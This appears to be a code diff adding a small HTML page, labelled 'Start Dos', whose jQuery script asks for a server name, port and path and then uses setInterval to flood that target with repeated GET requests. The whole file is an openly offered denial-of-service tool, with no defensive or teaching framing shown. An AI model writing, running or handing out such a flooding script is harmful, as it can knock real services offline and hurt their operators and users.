@@ -1,0 +1,42 @@
+<!DOCTYPEhtml>
+
+<html>
+
+<head>
+    <title>Title</title>
+    <script src="jquery-1.11.0.min.js"></script>
+</head>
+
+<body>
+    <div id="demo"></div>
+    <button id="but">Start Dos</button>
+    <script>
+        var serverName = "";
+        var portNum = 0;
+        var path = "";
+
+        $(document).ready(function () {
+            $("#but").click(sendRequest);
+        })
+
+        function requestHandler() {
+            $.get("http://"+serverName+":"+portNum+"/"+path,function (data, status) {
+                if (status == "success") {
+                    console.log(data);
+                }
+            });
+        }
+
+        function sendRequest() {
+            serverName = prompt("Enter your server name: ");
+            portNum = parseInt(prompt("Enter port number: "));
+            path = prompt("Enter the path: ");
+            if(serverName != "" && portNum != ""){
+                setInterval(requestHandler, 0.0001);
+            }
+        }
+
+    </script>
+</body>
+
+</html>
